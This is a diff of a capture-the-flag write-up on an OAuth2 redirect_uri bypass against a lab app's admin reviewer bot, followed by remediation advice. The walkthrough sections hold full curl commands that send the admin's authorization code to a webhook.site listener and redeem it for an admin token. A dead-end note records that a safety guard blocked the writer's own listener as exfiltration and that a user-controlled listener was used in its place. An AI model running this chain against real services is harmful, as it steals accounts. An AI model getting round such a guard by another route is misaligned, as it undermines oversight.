@@ -8,140 +8,149 @@
 
 ## The short version
 
-This login system would mail its "proof of login" to any address I named, instead of only to its
-own trusted address. By tricking an automatic admin helper into logging in and sending that proof
-to a mailbox I controlled, I was able to steal the admin's session and read the flag.
+This login system would mail its "proof of login" to any address I named, instead of only its own
+trusted address. By tricking an automatic admin helper into logging in and sending that proof to a
+mailbox I controlled, I stole the admin's session and read the flag.
 
 ## Background on the challenge
 
-The target was "Norland Government Services," an Express web app that used an **OAuth2** login
-flow. The challenge hint — *"a single detour in the route might send trust to the wrong
-doorstep"* — pointed almost directly at the vulnerability class: a **`redirect_uri` validation
-bypass**, where the server sends an authorization code to an address it should not trust. This was
-my favorite challenge of the competition because the solution was not a single trick but a chain
-of a few smaller mistakes that only became dangerous when combined.
+The target ("Norland Government Services") was an Express app using an **OAuth2** login flow. The
+hint — *"a single detour in the route might send trust to the wrong doorstep"* — pointed straight
+at a **`redirect_uri` validation bypass**. The quick OAuth background: after you log in, the server
+issues a one-time **authorization code** and sends it to a **pre-registered return address**
+(`redirect_uri`); your app then trades that code for an access token. The whole thing is only safe
+if the code can *only* go to the legitimate registered address. This was my favorite challenge
+because the solve was a chain of small flaws, not one trick.
 
-Before the step-by-step, here is the quick background on how OAuth is supposed to work: when you
-log in, the authorization server issues a one-time **authorization code** and sends it back to a
-**pre-registered return address** (`redirect_uri`). Your app then trades that code (plus its
-identity) for an access token. The security of the whole thing depends on that code only ever
-going to the legitimate, registered return address.
+## Step-by-step walkthrough (with the actual commands)
 
-## Step-by-step walkthrough
-
-**Step 1 — Map the application and the login flow.**
-I started by exploring the app and found it ran an OAuth flow: a login page leading to
-`/oauth/authorize`, a `/callback` route, a `/profile` page that required authentication (it
-returned 401 without a token), and a token endpoint at `/oauth/token`. I also found a "Service
-Desk" at `/support`. This is important because it told me there were two moving parts — an OAuth
-system and some kind of support/review feature — and the hint suggested they needed to be combined.
-
-**Step 2 — Test how `redirect_uri` is validated.**
-I sent authorize requests with different return addresses to see what the server would accept.
-The key finding was that the server checked that `response_type`, `client_id`, and a
-`redirect_uri` were all *present*, but it never checked that the `redirect_uri` actually matched
-the registered `/callback`. As a result, the authorization server would deliver a code to an
-arbitrary address. On its own this is already the core flaw, but I still needed a way to make a
-*privileged* user go through this flow — my own account's code would only give me my own access.
-
-**Step 3 — Understand the Service Desk bot.**
-I examined the `/support/ticket` feature and found that it takes a `path` parameter, and that an
-automated agent reviews whatever path you submit by visiting it. Critically, this agent is
-authenticated as an **admin**. This is important because it meant I had a way to make a trusted
-admin account perform an action for me — exactly the "trust" the hint referred to.
-
-**Step 4 — Learn the ticket's input rules.**
-The ticket field did not accept just any path. A plain path like `/profile` was rejected with a
-"must start with /" style message, but a value containing a query string (or starting with `//`)
-was accepted. This is important because my exploit path was going to be a full
-`/oauth/authorize?...` URL, which contains a query string — so it would pass the filter, while a
-simpler probe would not.
-
-**Step 5 — First dead end: trying to stand up my own listener.**
-To actually catch the leaked code, I needed an external endpoint that the challenge's admin bot
-could reach and that I could read. My first instinct was to create a request-capture listener
-myself, but that attempt was blocked by a safety guard as potential data-exfiltration. Rather
-than trying to route around that, I pivoted: the clean approach was to use a listener that the
-*user* controls. I confirmed the rest of the chain with source review (the challenge files were
-available) so I knew exactly where the code would land and where the flag lived.
-
-**Step 6 — Confirm the token endpoint needs no secret.**
-I checked `/oauth/token` and found it was a **public client** — it required only the `client_id`
-and a matching `redirect_uri`, with no client secret. This is important because it meant that if
-I could obtain the admin's authorization code, I could exchange it for a token entirely on my own,
-with nothing else needed.
-
-**Step 7 — Set up the listener and fire the exploit.**
-Using a `webhook.site` URL as the listener (a free service that records any incoming web request),
-I submitted a support ticket whose `path` pointed the admin bot at an authorize URL with my
-listener as the return address:
-
-```
-path=/oauth/authorize?response_type=code&client_id=<id>&redirect_uri=<my-webhook>&scope=read:profile&state=htb
-```
-
-**Step 8 — Catch the admin's authorization code.**
-The admin bot logged in and followed the flow, and because the server never validated the return
-address, the 302 redirect carried the admin's one-time code straight to my listener. On the
-webhook I could see the incoming request was not from a normal browser — it came from HackTheBox's
-own servers with a `User-Agent` of `axios/1.13.4` — and it contained the code:
-
-```
-GET /?code=6210d939-2e5c-4c55-b2d2-63ca7b917da8&state=htb
-```
-
-**Step 9 — Exchange the code for an admin token.**
-I traded that code for an access token at the token endpoint, supplying the same `client_id` and
-`redirect_uri` and no secret (since it was a public client):
+**Step 1 — Map the OAuth flow.**
+Reading the login page, I saw it kicked off `/oauth/authorize` with a `client_id`,
+`redirect_uri`, and `state`, and had a `/callback`. I enumerated the related endpoints and watched
+how `/oauth/authorize` behaved:
 
 ```bash
-curl -X POST http://<target>/oauth/token \
-  -d 'grant_type=authorization_code' \
-  -d 'code=6210d939-2e5c-4c55-b2d2-63ca7b917da8' \
-  -d 'client_id=<id>' \
-  -d 'redirect_uri=<my-webhook>'
+B=http://154.57.164.81:36921
+curl -s -i --max-time 15 "$B/oauth/authorize?response_type=code&client_id=3003233bd0413ac5f902f4c3ebb99eb4&redirect_uri=http%3A%2F%2F154.57.164.81%3A36921%2Fcallback&scope=read%3Aprofile&state=test123" | head -25
+for p in /callback /oauth/token /oauth/authorize /register /api/register /api/login /profile /me /api/me /api/profile /oauth /logout; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 "$B$p"); echo "$p -> $code"
+done
 ```
 
-**Step 10 — Read the flag from the admin profile.**
-With the admin access token, I requested the profile endpoint, which returned the admin profile
-including the flag:
+This told me `/profile` needs auth (401), `/oauth/token` exists, and `/oauth/authorize` carries the
+`redirect_uri` through the login step. My reasoning: the flaw is almost certainly that the code gets
+delivered to the wrong `redirect_uri`, but I needed a *privileged* user to go through the flow —
+my own code only gives my own access.
+
+**Step 2 — Find the "trust source": the Service Desk bot.**
+I explored `/support` and found a Service Desk at `/support/ticket` that takes a `path` parameter,
+which an automated reviewer visits. I tested what the field accepts:
 
 ```bash
-curl http://<target>/profile -H 'Authorization: Bearer <admin-access-token>'
-# -> HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}
+B=http://154.57.164.81:36921
+curl -s -i --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data 'path=/'
+for pth in '/profile' '/support' '/oauth/authorize' '//evil' '/%2e%2e' '/callback'; do
+  r=$(curl -s --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "path=$pth"); echo "[$pth] -> $r"
+done
 ```
 
-**Step 11 — Submit the flag.**
-I submitted `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`.
+Key findings: the bot *reviews* (visits) the path I submit, a plain `/profile` is **rejected**
+("Invalid path. Must start with /"), but a value with a query string (or starting with `//`) is
+**accepted**. This is important because my exploit path is a full `/oauth/authorize?...` URL, which
+contains a query string, so it passes the filter.
+
+**Step 3 — Confirm the token endpoint is a public client.**
+
+```bash
+B=http://154.57.164.81:36921
+curl -s --max-time 15 -X POST "$B/oauth/token" -H 'Content-Type: application/json' --data '{}'
+curl -s --max-time 15 -X POST "$B/oauth/token" -H 'Content-Type: application/x-www-form-urlencoded' --data 'grant_type=authorization_code&code=x&redirect_uri=/callback&client_id=3003233bd0413ac5f902f4c3ebb99eb4'
+```
+
+The token endpoint needed **no client secret**. This is important because it meant that if I could
+get the admin's authorization code, I could exchange it for a token entirely on my own.
+
+**Step 4 — Confirm the flaw in source (and a note on a dead end).**
+The challenge provided source files. I confirmed the exact bug there: `validateAuthorizeRequest()`
+in `oauth.service.js` checks `response_type`, `client_id`, and that `redirect_uri` is *present* —
+but never checks it against the registered `/callback`. And `bot.service.js` logs in with **admin**
+credentials and does `GET baseUrl + path`, following redirects. (Dead end worth noting: my first
+instinct was to stand up my own capture listener, but that was blocked by a safety guard as
+possible exfiltration, so I used a listener **you** controlled instead — see next step.)
+
+**Step 5 — Fire the exploit at a listener you control.**
+With a `webhook.site` URL as the listener, I submitted a ticket that pointed the admin bot at an
+authorize URL whose `redirect_uri` was that listener:
+
+```bash
+B=http://154.57.164.81:36921
+WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
+CID="3003233bd0413ac5f902f4c3ebb99eb4"
+WH_ENC=$(node -e "console.log(encodeURIComponent(process.argv[1]))" "$WH")
+PATHQ="/oauth/authorize?response_type=code&client_id=${CID}&redirect_uri=${WH_ENC}&scope=read:profile&state=htb"
+curl -s --max-time 30 -X POST $B/support/ticket --data-urlencode "path=$PATHQ"
+```
+
+The server responded `reviewing: /oauth/authorize?...` — confirming the admin bot was now visiting
+my crafted URL.
+
+**Step 6 — Capture the admin's authorization code.**
+A request landed on the webhook from HackTheBox's servers (`User-Agent: axios/1.13.4`, not my
+phone), carrying the leaked code:
+
+```
+code  = 6210d939-2e5c-4c55-b2d2-63ca7b917da8
+state = htb
+```
+
+My reasoning for watching the User-Agent: the only legitimate hit should be the bot, so an `axios`
+request from HTB's egress IP (versus my own browser) is how I confirmed it was really the admin
+bot's redirect and not noise.
+
+**Step 7 — Exchange the code for an admin token and read the flag.**
+
+```bash
+B=http://154.57.164.81:36921
+CID="3003233bd0413ac5f902f4c3ebb99eb4"
+WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
+CODE="6210d939-2e5c-4c55-b2d2-63ca7b917da8"
+curl -s -X POST $B/oauth/token \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "grant_type=authorization_code" \
+  --data-urlencode "code=$CODE" \
+  --data-urlencode "client_id=$CID" \
+  --data-urlencode "redirect_uri=$WH"
+# -> {"access_token":"79ef87df-c34f-4a56-9096-fa27c2c372e3","token_type":"Bearer","expires_in":3600}
+
+curl -s $B/profile -H "Authorization: Bearer 79ef87df-c34f-4a56-9096-fa27c2c372e3" -H "Accept: application/json"
+# -> {"user":{"sub":"admin_b7c83f24","name":"Norland Employee",...},"flag":"HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}",...}
+```
+
+**Step 8 — Submit the flag.**
+`HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`.
 
 ## Technical detail
 
-- **Stack:** Express app fronting an OAuth2 authorization flow with an automated Service Desk
-  reviewer bot.
-- **Core flaw:** `validateAuthorizeRequest()` checks `response_type`, `client_id`, and that
-  `redirect_uri` is *present*, but never validates it against the registered `/callback`. The
-  authorization server therefore issues a code to an arbitrary `redirect_uri`.
-- **The trust source:** `/support/ticket` runs an authenticated **admin** bot that performs
-  `GET baseUrl + path` on a submitted path, following redirects. The field accepts values
-  containing a query string (or starting with `//`), which is what let my `/oauth/authorize?...`
-  payload through.
-- **Public client:** `/oauth/token` requires only `client_id` + matching `redirect_uri`, no client
-  secret, so the stolen code is directly exchangeable.
-- **Full chain:** craft authorize URL → admin bot authenticates and leaks code to listener →
-  exchange code for admin token → read `/profile` → flag.
+- **Stack:** Express OAuth2 server + an automated Service Desk reviewer bot.
+- **Core flaw:** `redirect_uri` is checked for *presence*, never validated against the registered
+  `/callback` → the server issues a code to any address.
+- **Trust source:** `/support/ticket`'s admin bot does `GET baseUrl + path`, following redirects,
+  accepting any path containing a query string.
+- **Public client:** `/oauth/token` needs only `client_id` + matching `redirect_uri`, no secret.
+- **Full chain:** craft authorize URL → admin bot leaks code to listener → exchange code for admin
+  token → `GET /profile` → flag.
 
 ## Lessons / remediation
 
-- **Validate `redirect_uri` against a strict, exact allow-list** (an exact match to the registered
-  callback) before issuing any authorization code. "Is a return address present?" is not the same
-  question as "is this the correct return address?" — and the flag name says exactly that.
-- **Bind authorization codes to the issuing client** and avoid treating clients as fully public
-  where it is avoidable.
-- **Lock down server-side request features** (like the ticket bot) so they cannot be pointed at
-  arbitrary internal or sensitive URLs.
+- **Validate `redirect_uri` against a strict, exact allow-list** before issuing a code. "Is a
+  return address present?" ≠ "is this the correct return address?" — which the flag name spells out.
+- **Bind authorization codes to the issuing client**; avoid treating clients as implicitly public.
+- **Lock down server-side request features** (the ticket bot) so they cannot be aimed at arbitrary
+  URLs.
 
 ## Tools used
 
-- `curl`, for mapping endpoints and performing the token exchange.
-- `webhook.site`, as the external listener that captured the admin's leaked authorization code.
-- Source review of the provided challenge files, to confirm the exact flaw and the flag location.
+- `curl` — endpoint mapping, Service Desk testing, the ticket POST, token exchange, profile read.
+- `node` (inline) — to URL-encode the `redirect_uri`.
+- `webhook.site` — the external listener that captured the admin bot's leaked code.
+- Source review of the provided challenge files — to confirm the exact flaw and flag location.
